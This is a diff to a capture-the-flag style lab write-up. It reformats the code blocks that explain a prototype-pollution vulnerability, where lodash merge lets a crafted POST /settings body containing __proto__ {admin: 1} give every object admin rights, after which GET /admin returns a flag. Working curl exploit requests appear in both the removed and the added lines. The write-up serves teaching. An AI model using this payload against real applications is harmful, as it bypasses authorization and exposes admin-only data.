@@ -41,19 +41,23 @@ The entry point for this vulnerability is via the `POST /settings` endpoint whic
 
 The attack method for this vulnerability is accomplished by crafting a malicious `POST` request to the `/settings` endpoint in which the body contains a JSON Object with a `__proto__` property which contains an `admin` property set to a truthy value. This is ultimately merged using the insecure lodash `merge` function resulting in the `admin` property being added to the JavaScript Object Prototype which is subsequently inherited by all Objects within the application.
 
-```curl --location 'localhost:5001/settings' \
---header 'Content-Type: application/json' \
---data '{
-    "userSettings": {
-        "dark": "true",
-        "__proto__": {
-            "admin": 1
+```
+    curl --location 'localhost:5001/settings' \
+    --header 'Content-Type: application/json' \
+    --data '{
+        "userSettings": {
+            "dark": "true",
+            "__proto__": {
+                "admin": 1
+            }
         }
-    }
-}'```
+    }'
+```
 
 The exploitation of this vulnerability is ultimately to exflitrate information that only and admin user of the application would normally have access to. Once the Object Prototype has been polluted with an `admin` property, all user objects within the application will have an `admin` property and thus bypass any checks for admin privileges. This can ultimately be exploited by submitting a `GET` request to the `/admin` endpoint.
 
-```curl --location 'localhost:5001/admin'```
+```
+    curl --location 'localhost:5001/admin'
+```
 
 If you have completed the attack successfully you will receive a flag back from the request rather than a 403 error.
